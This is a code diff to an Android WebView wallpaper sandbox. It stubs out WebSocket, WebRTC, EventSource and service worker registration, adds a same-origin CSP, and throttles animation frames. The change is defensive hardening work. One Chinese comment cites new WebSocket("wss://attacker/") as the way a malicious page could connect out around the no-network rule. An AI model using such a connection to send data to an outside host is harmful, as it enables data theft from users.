@@ -30,15 +30,39 @@ object SandboxedWebViewFactory {
     const val DOMAIN = "appassets.local"
 
     /**
-     * rAF 补丁：页面每次调度 requestAnimationFrame 就记录时间戳。
-     * 这是壁纸引擎自适应渲染的“动态信号”之一（CSS 动画由 document.getAnimations
-     * 探测）；注入点在 onPageFinished，见该处的顺序说明。
+     * 沙箱引导补丁：经 WebViewCompat.addDocumentStartJavaScript 注入，
+     * 保证先于页面任何脚本执行。做三件事：
+     *
+     * 1. 禁网桩。shouldInterceptRequest 拦不到 WebSocket 握手与 WebRTC 流量
+     *    （WebView 不把这两类请求路由给拦截器），恶意页面可用
+     *    new WebSocket("wss://attacker/") 外联，绕过“壁纸默认禁网”的承诺。
+     *    这里把构造器整体替换为抛错桩（含同源——壁纸没有任何合法的 WS 场景）。
+     * 2. CSP meta 第二道防线。connect-src 'self'：拦截器覆盖不到的连接类流量
+     *    （含 Worker 内部 fetch）由内核强制只许同源——不能用 'none'，rain 等
+     *    壁纸会用 XHR/fetch 加载包内的着色器文件，'none' 会把它们打断。
+     * 3. rAF 节流门。性能档位 MEDIUM 承诺 ~30fps：把 requestAnimationFrame
+     *    包成按 __zunoFrameIntervalMs 节流的版本（0 = 不节流；LOW 档位由
+     *    CSS 冻结 + JS 暂停接管，不需要门）。此前注入的 rAF 时间戳探针
+     *    从未被消费、档位间隔字段也无人引用，MEDIUM 实际不生效。
      */
-    private const val RAF_PATCH_JS =
-        "(function(){var o=window.requestAnimationFrame;" +
-            "if(o&&!window.__zunoRafPatched){window.__zunoRafPatched=1;" +
-            "window.requestAnimationFrame=function(cb){window.__zunoRafAt=Date.now();" +
-            "return o.call(window,cb);};}})();"
+    private const val SANDBOX_BOOT_JS =
+        "(function(){" +
+            "var deny=function(name){return function(){throw new Error('ZUNO sandbox: '+name+' is disabled');};};" +
+            "try{window.WebSocket=deny('WebSocket');}catch(e){}" +
+            "try{window.RTCPeerConnection=deny('RTCPeerConnection');}catch(e){}" +
+            "try{window.webkitRTCPeerConnection=deny('RTCPeerConnection');}catch(e){}" +
+            "try{window.EventSource=deny('EventSource');}catch(e){}" +
+            "try{if(navigator.serviceWorker){navigator.serviceWorker.register=deny('serviceWorker.register');}}catch(e){}" +
+            "try{var m=document.createElement('meta');m.httpEquiv='Content-Security-Policy';" +
+            "m.content=\"connect-src 'self'\";(document.head||document.documentElement).appendChild(m);}catch(e){}" +
+            "if(!window.__zunoRafGate){window.__zunoRafGate=1;window.__zunoFrameIntervalMs=0;" +
+            "var nativeRaf=window.requestAnimationFrame.bind(window);var last=0;" +
+            "window.requestAnimationFrame=function(cb){" +
+            "var iv=window.__zunoFrameIntervalMs|0;" +
+            "if(iv<=0)return nativeRaf(cb);" +
+            "var now=Date.now();var next=Math.max(last+iv,now);last=next;" +
+            "return setTimeout(function(){nativeRaf(function(t){if(cb)cb(t);});},next-now);};}" +
+            "})();"
 
     @SuppressLint("SetJavaScriptEnabled")
     fun create(
@@ -106,11 +130,8 @@ object SandboxedWebViewFactory {
 
             override fun onPageFinished(view: WebView, url: String?) {
                 super.onPageFinished(view, url)
-                // 1) rAF 补丁（自适应渲染的动态信号，见 HtmlWallpaperEngine.PROBE_JS），
-                //    必须在页面自身脚本大量运行前打上；document_start 阶段更佳，
-                //    但 onPageFinished 内绝大多数 rAF 循环尚未启动，覆盖面足够。
-                view.evaluateJavascript(RAF_PATCH_JS, null)
-                // 2) 配置以“注入全局变量”的方式给页面，避免页面通过桥读取任意信息。
+                // 配置以“注入全局变量”的方式给页面，避免页面通过桥读取任意信息。
+                // （沙箱引导补丁已改为 document_start 注入，见 loadUrl 前的注册。）
                 view.evaluateJavascript(
                     "window.__ZUNO_CONFIG__ = $configJson;",
                     null,
@@ -144,6 +165,15 @@ object SandboxedWebViewFactory {
         }
 
         webView.addJavascriptInterface(WallpaperJsBridge(onSetConfig), "ZunoWallpaper")
+
+        // 沙箱引导补丁必须在页面任何脚本之前执行（禁网桩要抢在页面用 WebSocket
+        // 之前替换构造器），evaluateJavascript 在 onPageFinished 里打已经晚了。
+        // addDocumentStartJavaScript 由内核保证在文档创建时、页面脚本前运行。
+        androidx.webkit.WebViewCompat.addDocumentStartJavaScript(
+            webView,
+            listOf(SANDBOX_BOOT_JS),
+            setOf("https://$DOMAIN"),
+        )
 
         val pageUrl = Uri.parse("https://$DOMAIN/").buildUpon()
             .appendEncodedPath(entryRelativePath.trimStart('/'))
